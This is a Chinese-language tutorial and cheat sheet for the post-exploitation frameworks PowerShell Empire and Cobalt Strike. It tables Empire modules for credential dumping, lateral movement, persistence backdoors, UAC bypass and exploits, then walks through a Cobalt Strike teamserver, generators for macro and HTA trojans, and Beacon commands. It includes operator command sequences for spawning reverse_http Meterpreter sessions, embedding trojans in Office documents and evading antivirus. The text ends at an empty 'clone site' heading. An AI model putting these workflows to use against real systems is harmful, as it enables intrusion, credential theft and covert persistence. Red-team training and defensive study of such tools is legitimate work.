<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>code_execution/invoke_dllinjection</td><td>使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。</td></tr><tr><td>code_execution/invoke_metasploitpayload</td><td>生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动</td></tr><tr><td>code_execution/invoke_ntsd</td><td>使用NT Symbolic Debugger执行Empire launcher代码</td></tr><tr><td>code_execution/invoke_reflectivepeinjection</td><td>使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中</td></tr><tr><td>code_execution/invoke_shellcode</td><td>使用PowerSploit的Invoke--Shellcode注入Shellcode</td></tr><tr><td>code_execution/invoke_shellcodemsil</td><td>执行shellcode</td></tr></tbody></table>

#### **Credentials（身份凭证）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>credentials/credential_injection*</td><td>运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录</td></tr><tr><td>credentials/enum_cred_store</td><td>从Windows凭据管理器中转储当前交互用户的纯文本凭据</td></tr><tr><td>credentials/invoke_kerberoast</td><td>为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式</td></tr><tr><td>credentials/powerdump*</td><td>使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希</td></tr><tr><td>credentials/sessiongopher</td><td>提取WinSCP已保存的会话和密码</td></tr><tr><td>credentials/tokens</td><td>运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程</td></tr><tr><td>credentials/vault_credential*</td><td>运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证</td></tr><tr><td>credentials/mimikatz/cache*</td><td>运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes</td></tr><tr><td>credentials/mimikatz/certs*</td><td>运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录</td></tr><tr><td>credentials/mimikatz/command*</td><td>使用自定义命令运行PowerSploit的Invoke-Mimikatz函数</td></tr><tr><td>credentials/mimikatz/dcsync</td><td>运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码</td></tr><tr><td>credentials/mimikatz/dcsync_hashdump</td><td>运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希</td></tr><tr><td>credentials/mimikatz/extract_tickets</td><td>运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据</td></tr><tr><td>credentials/mimikatz/golden_ticket</td><td>运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存</td></tr><tr><td>credentials/mimikatz/keys*</td><td>运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录</td></tr><tr><td>credentials/mimikatz/logonpasswords*</td><td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。</td></tr><tr><td>credentials/mimikatz/lsadump*</td><td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。在域控制器上很有用。</td></tr><tr><td>credentials/mimikatz/mimitokens*</td><td>运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。</td></tr><tr><td>credentials/mimikatz/pth*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。</td></tr><tr><td>credentials/mimikatz/purge</td><td>运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据</td></tr><tr><td>credentials/mimikatz/sam*</td><td>运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希</td></tr><tr><td>credentials/mimikatz/silver_ticket</td><td>运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。</td></tr><tr><td>credentials/mimikatz/trust_keys*</td><td>运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。</td></tr></tbody></table>

#### **Exfiltration（数据窃取）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>exfiltration/egresscheck</td><td>可用于帮助检查主机与客户端系统之间的出口，详细信息：https://github.com/stufus/egresscheck-framework</td></tr><tr><td>exfiltration/exfil_dropbox</td><td>下载文件到dropbox</td></tr></tbody></table>

#### **Exploitation（漏洞利用EXP）**

<table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>exploitation/exploit_eternalblue</td><td>MS17_010永恒之蓝漏洞利用</td></tr><tr><td>exploitation/exploit_jboss</td><td>Jboss漏洞利用</td></tr><tr><td>exploitation/exploit_jenkins</td><td>在未授权访问的Jenkins脚本控制台上运行命令</td></tr></tbody></table>

#### **Lateral\_movement（横向移动）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>lateral_movement/inveigh_relay</td><td>smb中继攻击</td></tr><tr><td>lateral_movement/invoke_dcom</td><td>使用DCOM在远程主机上执行stager</td></tr><tr><td>lateral_movement/invoke_executemsbuild</td><td>该模块利用WMI和MSBuild编译并执行一个包含Empire launcher的xml文件。</td></tr><tr><td>lateral_movement/invoke_psexec</td><td>PsExec横向移动</td></tr><tr><td>lateral_movement/invoke_psremoting</td><td>远程PowerShell横向移动</td></tr><tr><td>lateral_movement/invoke_smbexec</td><td>SMBExec横向移动</td></tr><tr><td>lateral_movement/invoke_sqloscmd</td><td>利用xp_cmdshell横向移动</td></tr><tr><td>lateral_movement/invoke_sshcommand</td><td>利用SSH横向移动</td></tr><tr><td>lateral_movement/invoke_wmi</td><td>利用WMI横向移动</td></tr><tr><td>lateral_movement/invoke_wmi_debugger</td><td>使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager</td></tr><tr><td>lateral_movement/jenkins_script_console</td><td>利用未授权访问的Jenkins脚本控制台横向移动</td></tr><tr><td>lateral_movement/new_gpo_immediate_task</td><td>利用GPO中的计划任务横向移动</td></tr></tbody></table>

#### **Management（管理）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>management/enable_rdp*</td><td>在远程计算机上启用RDP并添加防火墙例外。</td></tr><tr><td>management/disable_rdp*</td><td>在远程计算机上禁用RDP</td></tr><tr><td>management/downgrade_account</td><td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td></tr><tr><td>management/enable_multi_rdp*</td><td>允许多个用户建立同时的RDP连接。</td></tr><tr><td>management/get_domain_sid</td><td>返回当前指定域的SID</td></tr><tr><td>management/honeyhash*</td><td>将人工凭证注入到LSASS</td></tr><tr><td>management/invoke_script</td><td>运行自定义脚本</td></tr><tr><td>management/lock</td><td>锁定工作站的显示</td></tr><tr><td>management/logoff</td><td>从计算机上注销当前用户（或所有用户）</td></tr><tr><td>management/psinject</td><td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td></tr><tr><td>management/reflective_inject</td><td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td></tr><tr><td>management/restart</td><td>重新启动指定的机器</td></tr><tr><td>management/runas</td><td>绕过GPO路径限制</td></tr><tr><td>management/shinject</td><td>将PIC Shellcode Payload注入目标进程</td></tr><tr><td>management/sid_to_user</td><td>将指定的域sid转换为用户</td></tr><tr><td>management/spawn</td><td>在新的powershell.exe进程中生成新agent</td></tr><tr><td>management/spawnas</td><td>使用指定的登录凭据生成agent</td></tr><tr><td>management/switch_listener</td><td>切换listener</td></tr><tr><td>management/timestomp</td><td>通过'调用Set-MacAttribute执行类似耗时的功能</td></tr><tr><td>management/user_to_sid</td><td>将指定的domain\user转换为domain sid</td></tr><tr><td>management/vnc</td><td>Invoke-Vnc在内存中执行VNC代理并启动反向连接</td></tr><tr><td>management/wdigest_downgrade*</td><td>将计算机上的wdigest设置为使用显式凭据</td></tr><tr><td>management/zipfolder</td><td>压缩目标文件夹以供以后渗透</td></tr><tr><td>management/mailraider/disable_security</td><td>此函数检查ObjectModelGuard</td></tr><tr><td>management/mailraider/get_emailitems</td><td>返回指定文件夹的所有项目</td></tr><tr><td>management/mailraider/get_subfolders</td><td>返回指定顶级文件夹中所有文件夹的列表</td></tr><tr><td>management/mailraider/mail_search</td><td>在给定的Outlook文件夹中搜索项目</td></tr><tr><td>management/mailraider/search_gal</td><td>返回与指定搜索条件匹配的所有exchange users</td></tr><tr><td>management/mailraider/send_mail</td><td>使用自定义或默认模板将电子邮件发送到指定地址。</td></tr><tr><td>management/mailraider/view_email</td><td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td></tr></tbody></table>

#### **Persistence（持久化）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>persistence/elevated/registry*</td><td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td></tr><tr><td>persistence/elevated/schtasks*</td><td>计划任务持久化</td></tr><tr><td>persistence/elevated/wmi*</td><td>WMI事件订阅持久化</td></tr><tr><td>persistence/elevated/wmi_updater*</td><td>WMI订阅持久化</td></tr><tr><td>persistence/misc/add_netuser</td><td>将域用户或本地用户添加到当前（或远程）计算机</td></tr><tr><td>persistence/misc/add_sid_history*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。仅适用于域控制器</td></tr><tr><td>persistence/misc/debugger*</td><td>将指定目标二进制文件的调试器设置为cmd.exe</td></tr><tr><td>persistence/misc/disable_machine_acct_change*</td><td>禁止目标系统的机器帐户自动更改其密码</td></tr><tr><td>persistence/misc/get_ssps</td><td>枚举所有已加载的安全软件包</td></tr><tr><td>persistence/misc/install_ssp*</td><td>安装安全支持提供程序dll</td></tr><tr><td>persistence/misc/memssp*</td><td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log</td></tr><tr><td>persistence/misc/skeleton_key*</td><td>运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。仅适用于域控制器</td></tr><tr><td>persistence/powerbreach/deaduser</td><td>DeadUserBackdoor后门，详细信息：http://www.sixdub.net/?p=535</td></tr><tr><td>persistence/powerbreach/eventlog*</td><td>启动事件循环后门</td></tr><tr><td>persistence/powerbreach/resolver</td><td>启动解析器后门</td></tr><tr><td>persistence/userland/backdoor_lnk</td><td>LNK文件后门</td></tr><tr><td>persistence/userland/registry</td><td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td></tr><tr><td>persistence/userland/schtasks</td><td>计划任务持久化</td></tr></tbody></table>

#### **Privesc（权限提升）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>privesc/ask</td><td>弹出一个对话框，询问用户是否要以管理员身份运行powershell</td></tr><tr><td>privesc/bypassuac</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_env</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_eventvwr</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_fodhelper</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_sdctlbypass</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_tokenmanipulation</td><td>UAC bypass</td></tr><tr><td>privesc/bypassuac_wscript</td><td>UAC bypass</td></tr><tr><td>privesc/getsystem*</td><td>获取system特权</td></tr><tr><td>privesc/gpp</td><td>利用windows组策略首选项缺陷获取系统帐号</td></tr><tr><td>privesc/mcafee_sitelist</td><td>寻找McAfee SiteList.xml文件的纯文本密码</td></tr><tr><td>privesc/ms16-032</td><td>MS16-032本地提权</td></tr><tr><td>privesc/ms16-135</td><td>MS16-135本地提权</td></tr><tr><td>privesc/tater</td><td>利用PowerShell实现的Hot Potato提权</td></tr><tr><td>privesc/powerup/allchecks</td><td>检查目标主机的攻击向量以进行权限提升</td></tr><tr><td>privesc/powerup/find_dllhijack</td><td>查找通用的.DLL劫持</td></tr><tr><td>privesc/powerup/service_exe_restore</td><td>还原备份的服务二进制文件</td></tr><tr><td>privesc/powerup/service_exe_stager</td><td>备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件</td></tr><tr><td>privesc/powerup/service_exe_useradd</td><td>修改目标服务以创建本地用户并将其添加到本地管理员</td></tr><tr><td>privesc/powerup/service_stager</td><td>修改目标服务以执行Empire stager</td></tr><tr><td>privesc/powerup/service_useradd</td><td>修改目标服务以创建本地用户并将其添加到本地管理员</td></tr><tr><td>privesc/powerup/write_dllhijacker</td><td>将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机</td></tr></tbody></table>

#### **Recon（侦察）**

<table><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>recon/find_fruit</td><td>在网络范围内搜索潜在的易受攻击的Web服务</td></tr><tr><td>recon/get_sql_server_login_default_pw</td><td>发现在当前广播域之内的SQL Server实例</td></tr><tr><td>recon/http_login</td><td>针对基本身份验证测试凭据</td></tr></tbody></table>

#### **Situational\_awareness（态势感知）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th><br></th></tr></thead><tbody><tr><td>situational_awareness/host/antivirusproduct</td><td>获取防病毒产品信息</td></tr><tr><td>situational_awareness/host/computerdetails*</td><td>枚举有关系统的有用信息</td></tr><tr><td>situational_awareness/host/dnsserver</td><td>枚举系统使用的DNS服务器</td></tr><tr><td>situational_awareness/host/findtrusteddocuments</td><td>该模块将枚举适当的注册表</td></tr><tr><td>situational_awareness/host/get_pathacl</td><td>枚举给定文件路径的ACL</td></tr><tr><td>situational_awareness/host/get_proxy</td><td>枚举当前用户的代理服务器和WPAD内容</td></tr><tr><td>situational_awareness/host/get_uaclevel</td><td>枚举UAC级别</td></tr><tr><td>situational_awareness/host/monitortcpconnections</td><td>监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td></tr><tr><td>situational_awareness/host/paranoia*</td><td>持续检查运行过程中是否存在可疑用户</td></tr><tr><td>situational_awareness/host/winenum</td><td>收集有关主机和当前用户上下文的相关信息</td></tr><tr><td>situational_awareness/network/arpscan</td><td>针对给定范围的IPv4 IP地址执行ARP扫描</td></tr><tr><td>situational_awareness/network/bloodhound</td><td>执行BloodHound数据收集</td></tr><tr><td>situational_awareness/network/get_exploitable_system</td><td>查询Active Directory以查找可能容易受到Metasploit Exploit的系统</td></tr><tr><td>situational_awareness/network/get_spn</td><td>获取服务主体名称（SPN）</td></tr><tr><td>situational_awareness/network/get_sql_instance_domain</td><td>返回SQL Server实例列表</td></tr><tr><td>situational_awareness/network/get_sql_server_info</td><td>从目标SQL Server返回基本服务器和用户信息</td></tr><tr><td>situational_awareness/network/portscan</td><td>使用常规套接字进行简单的端口扫描</td></tr><tr><td>situational_awareness/network/reverse_dns</td><td>执行给定IPv4 IP范围的DNS反向查找</td></tr><tr><td>situational_awareness/network/smbautobrute</td><td>针对用户名/密码列表运行SMB暴力破解</td></tr><tr><td>situational_awareness/network/smbscanner</td><td>在多台机器上测试用户名/密码组合</td></tr><tr><td>situational_awareness/network/powerview/find_foreign_group</td><td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td></tr><tr><td>situational_awareness/network/powerview/find_foreign_user</td><td>枚举在其主域之外的组中的用户</td></tr><tr><td>situational_awareness/network/powerview/find_gpo_computer_admin</td><td>获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限</td></tr><tr><td>situational_awareness/network/powerview/find_gpo_location</td><td>获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机</td></tr><tr><td>situational_awareness/network/powerview/find_localadmin_access</td><td>在当前用户具有“本地管理员”访问权限的本地域上查找计算机</td></tr><tr><td>situational_awareness/network/powerview/find_managed_security_group</td><td>此功能检索域中的所有安全组</td></tr><tr><td>situational_awareness/network/powerview/get_cached_rdpconnection</td><td>使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息</td></tr><tr><td>situational_awareness/network/powerview/get_computer</td><td>查询当前计算机对象的域</td></tr><tr><td>situational_awareness/network/powerview/get_dfs_share</td><td>返回给定域的所有容错分布式文件系统的列表</td></tr><tr><td>situational_awareness/network/powerview/get_domain_controller</td><td>返回当前域或指定域的域控制器</td></tr><tr><td>situational_awareness/network/powerview/get_domain_policy</td><td>返回给定域或域控制器的默认域或DC策略</td></tr><tr><td>situational_awareness/network/powerview/get_domain_trust</td><td>返回当前域或指定域的所有域信任</td></tr><tr><td>situational_awareness/network/powerview/get_fileserver</td><td>返回从用户主目录提取的所有文件服务器的列表</td></tr><tr><td>situational_awareness/network/powerview/get_forest</td><td>返回有关给定域森林的信息</td></tr><tr><td>situational_awareness/network/powerview/get_forest_domain</td><td>返回给定林的所有域</td></tr><tr><td>situational_awareness/network/powerview/get_gpo</td><td>获取域中所有当前GPO的列表</td></tr><tr><td>situational_awareness/network/powerview/get_group</td><td>获取域中所有当前组的列表</td></tr><tr><td>situational_awareness/network/powerview/get_group_member</td><td>返回给定组的成员</td></tr><tr><td>situational_awareness/network/powerview/get_localgroup</td><td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td></tr><tr><td>situational_awareness/network/powerview/get_loggedon</td><td>执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户</td></tr><tr><td>situational_awareness/network/powerview/get_object_acl</td><td>返回与特定活动目录对象关联的ACL</td></tr><tr><td>situational_awareness/network/powerview/get_ou</td><td>获取域中所有当前OU的列表</td></tr><tr><td>situational_awareness/network/powerview/get_rdp_session</td><td>在给定的RDP远程服务中查询活动会话和原始IP</td></tr><tr><td>situational_awareness/network/powerview/get_session</td><td>执行NetSessionEnum Win32API调用以查询主机上的活动会话</td></tr><tr><td>situational_awareness/network/powerview/get_site</td><td>获取域中所有当前站点的列表</td></tr><tr><td>situational_awareness/network/powerview/get_subnet</td><td>获取域中所有当前子网的列表</td></tr><tr><td>situational_awareness/network/powerview/get_user</td><td>查询给定用户或指定域中用户的信息</td></tr><tr><td>situational_awareness/network/powerview/map_domain_trust</td><td>使用.CSV输出映射所有可访问的域信任</td></tr><tr><td>situational_awareness/network/powerview/process_hunter</td><td>查询远程机器的进程列表</td></tr><tr><td>situational_awareness/network/powerview/set_ad_object</td><td>使用SID，名称或SamAccountName来查询指定的域对象</td></tr><tr><td>situational_awareness/network/powerview/share_finder</td><td>在域中的计算机上查找共享</td></tr><tr><td>situational_awareness/network/powerview/user_hunter</td><td>查找指定组的用户登录的机器</td></tr></tbody></table>

#### **Trollsploit（恶作剧）**

<table style="width: 768px;"><thead><tr><th>模块名</th><th>功能</th></tr></thead><tbody><tr><td>trollsploit/get_schwifty</td><td>播放Schwifty视频，同时把计算机音量设置最大</td></tr><tr><td>trollsploit/message</td><td>发送一个消息框</td></tr><tr><td>trollsploit/process_killer</td><td>终止以特定名称开头的任何进程</td></tr><tr><td>trollsploit/rick_ascii</td><td>生成一个新的powershell.exe进程运行Lee Holmes' ASCII Rick Roll</td></tr><tr><td>trollsploit/rick_astley</td><td>运行SadProcessor's beeping rickroll</td></tr><tr><td>trollsploit/thunderstruck</td><td>播放Thunderstruck视频，同时把计算机音量设置最大</td></tr><tr><td>trollsploit/voicetroll</td><td>通过目标上的合成语音朗读文本</td></tr><tr><td>trollsploit/wallpaper</td><td>将.jpg图片上传到目标机器并将其设置为桌面壁纸</td></tr><tr><td>trollsploit/wlmdr</td><td>在任务栏中显示气球提示</td></tr></tbody></table>

#### **Empire Word**

```
`>usestager windows/launcher_bat生成bat木马，设置Listener``Word/Excel->插入->对象->由文件创建，选择bat，显示为图标，修改图标``Macro``>usestager windows/macro 设置Listener``Word/Excel->试图->宏->创建，复制macro进去`
```

#### **Empire派生Cobalt Strike和MSF**

##### **派生MSF**

```
`可绕过杀软``Empire``>usemodule code_execution/invoke_shellcode``>set Lhost 192.168.0.1``>set Lport 4444``>set Payload reverse_http``MSF``>use exploit/multi/handler``>set payloadwindows/meterpreter/reverse_http``>set Lhost 192.168.31.247``>set lport 4444``>run``或Empire``>usemodule code_execution/invoke_metasploitpayload``>set URL http://SRVHOST:SRVPORT``MSF``#use exploit/multi/script/web_delivery``#set payload windows/x64/meterpreter/reverse_tcp``设置SRVHOST SRVPORT`
```

```
**派生Cobalt Strike**  

```

```
`创建监听器/windows/beacon_http/reverse_http 设置端口和主机``Empire``>usemodule code_execution/invoke_shellcode``>set Lhost 192.168.0.1``>set Lport 4444``>set Payload reverse_http`
```

```
  

```

### **Cobalt Strike**

```
`安装``需要JDK环境``>tar -xzvf jdk-8u191-linux-x64.tar.gz`
```

#### 部署TeamServer

```
`>./teamserver 192.168.0.107 123456``格式是外网IP和密码`
```

```
  

```

#### 模块

```
`New Connection：新建连接``Preferences：设置外观``Visualization：查看主机的不同形式``VPN Interfaces：VPN接口``Listeners：监听器``Script Interfaces：查看和加载CNA脚本``Close：关闭CS`
```

#### **连接**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### **监听器**

```
`创建``Cobalt Strike -> Listeners点击Add`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`Beacon为CS内部监听器。``Foreign一般与MSF结合使用。``系统架构的支持`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

####   

#### **攻击模块**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

<table style="width: 768px;"><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>HTML Application</td><td>基于powershell的.hta格式的HTML Application木马，分为可执行文件、PowerShell、VBA三种方法</td></tr><tr><td>MS Office Macro</td><td>office宏病毒文件</td></tr><tr><td>Payload Generator</td><td>基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等语言的payload</td></tr><tr><td>USB/CD AutoPlay</td><td>利用USB/CD自动播放运行的木马</td></tr><tr><td>Windows Dropper</td><td>捆绑器</td></tr><tr><td>Windows Executable</td><td>生成32位或64位的exe和基于服务的可执行文件、DLL等后门</td></tr><tr><td>Windows Executable(S)</td><td>生成可执行文件，支持powershell脚本，提供代理功能</td></tr></tbody></table>

```
Web Drive-by基于WEB的攻击模块  

```

<table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>Manage</td><td>管理开启的模块</td></tr><tr><td>Clone Site</td><td>克隆网站</td></tr><tr><td>Host File</td><td>提供文件下载</td></tr><tr><td>Scripted Web Delivery</td><td>基于Web的攻击Payload</td></tr><tr><td>Signed Applet Attack</td><td>运行java自签名的攻击模块</td></tr><tr><td>Smart Applet Attack</td><td>自动检测Java版本并利用已知的exploits攻击</td></tr><tr><td>System Profiler</td><td>信息探测模块</td></tr></tbody></table>

#### 视图模块

<table><thead><tr><th>Applications</th><th>显示靶机应用信息</th></tr></thead><tbody><tr><td>Credentials</td><td>显示密码(hashdump和mimikatz获取的)</td></tr><tr><td>Downloads</td><td>下载文件</td></tr><tr><td>Event Log</td><td>事件日志</td></tr><tr><td>Keystrokes</td><td>键盘记录</td></tr><tr><td>Proxy Pivots</td><td>代理信息</td></tr><tr><td>Screenshots</td><td>屏幕截图</td></tr><tr><td>Script Console</td><td>加载脚本</td></tr><tr><td>Targets</td><td>查看目标</td></tr><tr><td>Web Log</td><td>查看web日志</td></tr></tbody></table>

```
创建powershell脚本
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
复制脚本到目标机执行即可上线.
```

**交互**  

```
`右键目标机Interact进入交互模式``Access` `Dump hashes  获取密码``Elevate  提权``Golden Ticket  黄金票据注入会话``Make token  制作令牌``Run Mimikatz  运行mimikatz``Spawn As  以靶机其他用户权限生成会话``Explore` `Browser Pivot  劫持浏览器``Desktop(VNC)  远程VNC``File Browser  文件管理``Net View  执行命令net view``Port scan  端口扫描``Process list  进程列表``Screenshot  截图``Pivoting` `SOCKS Server  代理``Listener  已获权限的机器当作监听器(反向端口转发)``Deploy VPN  部署VPN``Spawn` `派生会话：联动MSF或Armitage` `右键执行mimikatz即可获取hash及明文密码`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
视图->凭证信息列出密码，类似empire的creds命令
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

#### **Beacon**

```
`argue                     进程参数欺骗``blockdlls                  阻止子进程加载非Microsoft DLL``browserpivot              注入受害者浏览器进程``bypassuac                绕过UAC提升权限``cancel                    取消正在进行的下载``cd                        切换目录``checkin                   强制让被控端回连一次``clear                     清除beacon内部的任务队列``connect                   Connect to a Beacon peer over TCP``covertvpn                 部署Covert VPN客户端``cp                        复制文件``dcsync                    从DC中提取密码哈希``desktop                   远程桌面(VNC)``dllinject                   反射DLL注入进程``dllload                    使用LoadLibrary将DLL加载到进程中``download                 下载文件``downloads                列出正在进行的文件下载``drives                     列出目标盘符``elevate                    使用exp``execute                   在目标上执行程序(无输出)``execute-assembly         在目标上内存中执行本地.NET程序``exit                       终止beacon会话``getprivs                   Enable system privileges on current token``getsystem                 尝试获取SYSTEM权限``getuid                     获取用户ID``hashdump                  转储密码哈希值``help                       帮助``inject                      在注入进程生成会话``jobkill                     结束一个后台任务``jobs                       列出后台任务``kerberos_ccache_use       从ccache文件中导入票据应用于此会话``kerberos_ticket_purge     清除当前会话的票据``kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话``keylogger                 键盘记录``kill                      结束进程``link                      Connect to a Beacon peer over a named pipe``logonpasswords            使用mimikatz转储凭据和哈希值``ls                        列出文件``make_token                创建令牌以传递凭据``mimikatz                  运行mimikatz``mkdir                     创建一个目录``mode dns                  使用DNS A作为通信通道(仅限DNS beacon)``mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)``mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)``mode http                 使用HTTP作为通信通道``mv                        移动文件``net                       net命令``note                      备注` `portscan                  进行端口扫描``powerpick                 通过Unmanaged PowerShell执行命令``powershell                通过powershell.exe执行命令``powershell-import         导入powershell脚本``ppid                      Set parent PID for spawned post-ex jobs``ps                        显示进程列表``psexec                    Use a service to spawn a session on a host``psexec_psh                Use PowerShell to spawn a session on a host``psinject                  在特定进程中执行PowerShell命令``pth                       使用Mimikatz进行传递哈希``pwd                       当前目录位置``reg                       Query the registry``rev2self                  恢复原始令牌``rm                        删除文件或文件夹``rportfwd                  端口转发``run                       在目标上执行程序(返回输出)``runas                     以其他用户权限执行程序``runasadmin                在高权限下执行程序``runu                      Execute a program under another PID``screenshot                屏幕截图``setenv                    设置环境变量``shell                     执行cmd命令``shinject                  将shellcode注入进程``shspawn                   启动一个进程并将shellcode注入其中``sleep                     设置睡眠延迟时间``socks                     启动SOCKS4代理``socks stop                停止SOCKS4``spawn                     Spawn a session` `spawnas                   Spawn a session as another user``spawnto                   Set executable to spawn processes into``spawnu                    Spawn a session under another PID``ssh                       使用ssh连接远程主机``ssh-key                   使用密钥连接远程主机``steal_token               从进程中窃取令牌``timestomp                 将一个文件的时间戳应用到另一个文件``unlink                    Disconnect from parent Beacon``upload                    上传文件``wdigest                   使用mimikatz转储明文凭据``winrm                     使用WinRM横向渗透``wmi                       使用WMI横向渗透``执行命令，在beacon模式下键入shell+命令`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`>sleep 0 交互模式，立刻执行命令``注入DLL到某个进程``>dllload [pid] [c:\path\to\file.dll] DLL需在目标上``>kerberos_ticket_purge 清除票据``>kerberos_ccache_use  [/path/to/file.ccache]  从ccache文件导入票据``>kerberos_ticket_use [/path/to/file.ccache] 从ticket文件导入票据``>kill pid 结束进程``>timestomp [fileA]  [fileB] 修改文件时间戳``>getuid   获取当前用户``>steal_token [pid] 窃取进程ID``>rev2self 恢复原始令牌``>powershell-import  [/path/to/local/script.ps1] 导入PS模块` `>shinject [pid] <x86|x64> [/path/to/my.bin] 向进程注入shellcode``>socks  port在指定端口开启代理``>socks stop停止代理``>rportfwd [bind port]  [forward host]  [forward port]开启端口转发`
```

#### **克隆网站**

```
